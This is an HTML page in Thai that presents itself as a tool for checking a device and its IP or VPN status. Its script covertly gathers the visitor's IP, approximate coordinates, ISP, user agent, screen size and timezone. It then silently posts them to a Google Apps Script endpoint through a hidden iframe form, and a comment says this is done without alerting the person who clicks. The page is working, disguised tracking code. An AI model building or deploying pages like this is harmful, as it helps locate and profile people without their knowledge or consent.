<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>ตรวจสอบข้อมูลเครื่อง</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Tahoma, sans-serif;
      background: linear-gradient(135deg, #020617, #111827, #1e293b);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 18px;
    }

    .box {
      width: 100%;
      max-width: 900px;
      background: #0f172a;
      padding: 28px;
      border-radius: 24px;
      box-shadow: 0 18px 45px rgba(0, 0, 0, 0.55);
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    h1 {
      margin: 0 0 12px;
      text-align: center;
      font-size: 34px;
      line-height: 1.25;
      color: #ffffff;
    }

    .desc {
      color: #cbd5e1;
      text-align: center;
      line-height: 1.7;
      margin-bottom: 22px;
      font-size: 20px;
    }

    button {
      width: 100%;
      padding: 22px;
      font-size: 28px;
      border: none;
      border-radius: 18px;
      background: #22c55e;
      color: white;
      cursor: pointer;
      font-weight: bold;
      transition: 0.2s;
      box-shadow: 0 12px 25px rgba(34, 197, 94, 0.28);
    }

    button:hover {
      background: #16a34a;
    }

    button:disabled {
      background: #64748b;
      cursor: not-allowed;
      box-shadow: none;
    }

    .result {
      margin-top: 24px;
      background: #020617;
      padding: 24px;
      border-radius: 18px;
      white-space: pre-wrap;
      line-height: 1.7;
      overflow-x: auto;
      min-height: 240px;
      font-size: 28px;
      font-weight: bold;
      color: #f8fafc;
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    .small {
      margin-top: 14px;
      font-size: 15px;
      color: #94a3b8;
      line-height: 1.6;
      text-align: center;
    }

    @media (max-width: 600px) {
      .box {
        padding: 20px;
        border-radius: 18px;
      }

      h1 {
        font-size: 28px;
      }

      .desc {
        font-size: 17px;
      }

      button {
        font-size: 23px;
        padding: 20px;
      }

      .result {
        font-size: 23px;
        padding: 18px;
      }
    }
  </style>
</head>

<body>

<div class="box">
  <h1>ตรวจสอบข้อมูลเครื่อง</h1>

  <div class="desc">
    กดปุ่มเพื่อดึงชื่อเครื่อง และข้อมูล IP / VPN
  </div>

  <button id="btn" onclick="sendLocation()">
    กดเพื่อตรวจสอบ
  </button>

  <div class="small">
    ระบบจะแสดงชื่อเครื่อง และตำแหน่งโดยประมาณจาก IP
  </div>

  <div id="result" class="result">ยังไม่มีข้อมูล</div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxko8G7j9uAGrrpHPrcGww7y9bvREgA2sBcbzxphsHkJkrv-OCPWFA3LSNsAg-LG7BowA/exec";

const btn = document.getElementById("btn");
const result = document.getElementById("result");

function val(v) {
  if (v === null || v === undefined || v === "") return "-";
  return v;
}

function getDeviceName() {
  const ua = navigator.userAgent;

  if (/iPhone/i.test(ua)) return "iPhone";
  if (/iPad/i.test(ua)) return "iPad";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";

  return "Unknown Device";
}

function getBrowserName() {
  const ua = navigator.userAgent;

  if (ua.includes("Edg")) return "Microsoft Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  if (ua.includes("Chrome") && !ua.includes("CriOS")) return "Google Chrome";
  if (ua.includes("CriOS")) return "Chrome iOS";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari")) return "Safari";

  return "Unknown Browser";
}

function getBrowserTimezone() {
  try {
    return Intl.DateTimeFormat().resolvedOptions().timeZone || "";
  } catch {
    return "";
  }
}

function base64UrlEncode(str) {
  const utf8 = unescape(encodeURIComponent(str));
  const base64 = btoa(utf8);

  return base64
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/g, "");
}

function getCountryFullName(countryName, countryCode) {
  const code = String(countryCode || "").toUpperCase();
  const name = String(countryName || "").trim();

  const countryMap = {
    TH: "ประเทศไทย",
    SG: "สิงคโปร์",
    LA: "ลาว",
    KH: "กัมพูชา",
    MM: "เมียนมา",
    VN: "เวียดนาม",
    MY: "มาเลเซีย",
    ID: "อินโดนีเซีย",
    PH: "ฟิลิปปินส์",
    CN: "จีน",
    HK: "ฮ่องกง",
    TW: "ไต้หวัน",
    JP: "ญี่ปุ่น",
    KR: "เกาหลีใต้",
    US: "สหรัฐอเมริกา",
    GB: "สหราชอาณาจักร",
    AU: "ออสเตรเลีย",
    IN: "อินเดีย",
    RU: "รัสเซีย",
    DE: "เยอรมนี",
    FR: "ฝรั่งเศส",
    CA: "แคนาดา"
  };

  if (countryMap[code]) return countryMap[code];

  if (name === "Thailand" || name === "Thai" || name === "ไทย") {
    return "ประเทศไทย";
  }

  if (name === "Singapore") {
    return "สิงคโปร์";
  }

  return name || "-";
}

async function fetchJsonWithTimeout(url, timeout = 6000) {
  const controller = new AbortController();

  const timer = setTimeout(() => {
    controller.abort();
  }, timeout);

  try {
    const res = await fetch(url, {
      cache: "no-store",
      signal: controller.signal
    });

    if (!res.ok) {
      throw new Error("HTTP " + res.status);
    }

    return await res.json();
  } finally {
    clearTimeout(timer);
  }
}

async function getIPInfo() {
  const jobs = [
    async function () {
      const d = await fetchJsonWithTimeout("https://ipapi.co/json/", 6000);

      return {
        source_api: "ipapi.co",
        ip: d.ip || "",
        country_name: d.country_name || "",
        country_code: d.country_code || d.country || "",
        latitude: d.latitude || "",
        longitude: d.longitude || "",
        org: d.org || "",
        timezone: d.timezone || ""
      };
    },

    async function () {
      const d = await fetchJsonWithTimeout("https://ipwho.is/", 6000);

      if (d.success === false) {
        throw new Error(d.message || "ipwho.is failed");
      }

      return {
        source_api: "ipwho.is",
        ip: d.ip || "",
        country_name: d.country || "",
        country_code: d.country_code || "",
        latitude: d.latitude || "",
        longitude: d.longitude || "",
        org: d.connection && d.connection.org ? d.connection.org : "",
        timezone: d.timezone && d.timezone.id ? d.timezone.id : ""
      };
    },

    async function () {
      const d = await fetchJsonWithTimeout("https://get.geojs.io/v1/ip/geo.json", 6000);

      return {
        source_api: "geojs.io",
        ip: d.ip || "",
        country_name: d.country || "",
        country_code: d.country_code || "",
        latitude: d.latitude || "",
        longitude: d.longitude || "",
        org: d.organization_name || "",
        timezone: d.timezone || ""
      };
    }
  ];

  try {
    return await Promise.any(jobs.map(job => job()));
  } catch (err) {
    console.warn("Geo IP APIs failed:", err);

    try {
      const d = await fetchJsonWithTimeout("https://api.ipify.org?format=json", 5000);

      return {
        source_api: "api.ipify.org",
        ip: d.ip || "",
        country_name: "",
        country_code: "",
        latitude: "",
        longitude: "",
        org: "",
        timezone: "",
        error: "ดึงได้เฉพาะ IP ไม่มีประเทศและพิกัด"
      };
    } catch (e) {
      return {
        source_api: "",
        ip: "",
        country_name: "",
        country_code: "",
        latitude: "",
        longitude: "",
        org: "",
        timezone: "",
        error: "ดึงข้อมูล IP ไม่สำเร็จทุก API"
      };
    }
  }
}

function normalizeIP(ip) {
  return {
    ip: ip.ip || "",
    country_name: ip.country_name || ip.country || "",
    country_code: ip.country_code || "",
    latitude: ip.latitude || ip.lat || "",
    longitude: ip.longitude || ip.lon || "",
    org: ip.org || "",
    timezone: ip.timezone || "",
    source_api: ip.source_api || "",
    error: ip.error || ""
  };
}

/*
  ส่งข้อมูลไป Admin แบบเงียบ ๆ
  ไม่ alert ฝั่งผู้กด
*/
async function postToAdmin(payload) {
  return new Promise((resolve) => {
    const iframeName = "hidden_iframe_" + Date.now();

    const iframe = document.createElement("iframe");
    iframe.name = iframeName;
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    const form = document.createElement("form");
    form.method = "POST";
    form.action = SCRIPT_URL;
    form.target = iframeName;
    form.style.display = "none";

    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "payload";
    input.value = base64UrlEncode(JSON.stringify(payload));

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();

    setTimeout(() => {
      form.remove();
      iframe.remove();

      resolve({
        ok: true,
        message: "sent"
      });
    }, 1200);
  });
}

function showLoading(deviceName) {
  result.textContent =
`1 ชื่อเครื่อง
ชื่อเครื่อง: ${deviceName}


====== ข้อมูล IP / VPN ======
กำลังดึงข้อมูล IP...`;
}

function showResult(payload) {
  result.textContent =
`1 ชื่อเครื่อง
ชื่อเครื่อง: ${val(payload.device_name)}


====== ข้อมูล IP / VPN ======
ประเทศ: ${val(payload.ip_country)}
IP: ${val(payload.ip)}

Google Maps IP:
${val(payload.ip_google_maps)}`;
}

function showError(deviceName) {
  result.textContent =
`1 ชื่อเครื่อง
ชื่อเครื่อง: ${deviceName}


====== ข้อมูล IP / VPN ======
ดึงข้อมูล IP ไม่สำเร็จ

ลองใหม่อีกครั้ง หรือปิด AdBlock / VPN บางตัวที่บล็อก API`;
}

async function sendLocation() {
  btn.disabled = true;
  btn.textContent = "กำลังตรวจสอบ...";

  const deviceName = getDeviceName();

  showLoading(deviceName);

  try {
    const rawIP = await Promise.race([
      getIPInfo(),
      new Promise((_, reject) => {
        setTimeout(() => reject(new Error("IP_TIMEOUT")), 7000);
      })
    ]);

    const ip = normalizeIP(rawIP);

    const countryFullName = getCountryFullName(
      ip.country_name,
      ip.country_code
    );

    const ipGoogleMaps =
      ip.latitude && ip.longitude
        ? `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`
        : "ไม่พบพิกัดจาก IP";

    const payload = {
      device_name: deviceName,

      browser: getBrowserName(),
      platform: navigator.platform || "",
      user_agent: navigator.userAgent || "",
      language: navigator.language || "",
      screen: `${screen.width}x${screen.height}`,
      timezone_browser: getBrowserTimezone(),

      ip: ip.ip || "",
      ip_country: countryFullName,
      ip_country_code: ip.country_code || "",
      ip_latitude: ip.latitude || "",
      ip_longitude: ip.longitude || "",
      ip_google_maps: ipGoogleMaps,
      ip_org: ip.org || "",
      ip_timezone: ip.timezone || "",
      ip_source_api: ip.source_api || "",
      ip_error: ip.error || "",

      sent_at: new Date().toLocaleString("th-TH")
    };

    showResult(payload);

    postToAdmin(payload).catch(err => {
      console.warn("ส่งข้อมูลไม่สำเร็จ:", err);
    });

  } catch (err) {
    console.warn("IP error:", err);
    showError(deviceName);
  }

  btn.disabled = false;
  btn.textContent = "กดเพื่อตรวจสอบ";
}
</script>

</body>
</html>
